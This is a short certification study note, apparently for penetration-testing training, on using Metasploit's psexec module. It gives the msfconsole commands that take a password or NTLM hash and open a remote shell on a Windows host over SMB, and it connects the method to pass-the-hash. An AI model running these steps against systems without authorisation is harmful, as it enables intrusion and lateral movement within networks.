---
title: "PsExec: remote command execution over SMB"
description: "Microsoft's lightweight telnet replacement for running commands over SMB with valid credentials."
pubDate: 2026-11-11
category: "Cybersecurity"
source: "INE Certification"
lang: "msfconsole"
tags: ["psexec", "smb", "windows", "metasploit"]
draft: false
---

PsExec authenticates over SMB and executes processes on a remote Windows system under any account you have valid credentials (or a hash) for. It's functionally similar to RDP, except you're sending commands rather than controlling an entire session.

```bash
# Metasploit's psexec module
use exploit/windows/smb/psexec
set RHOSTS <target_ip>
set SMBUser <username>
set SMBPass <password_or_ntlm_hash>
run
```

Once you have legitimate SMB credentials (brute-forcing or hash dump), PsExec is usually the fastest path to obtain a shell. It's the same mechanic underlying pass-the-hash attacks against SMB, since the module accepts an NTLM hash in place of a password.
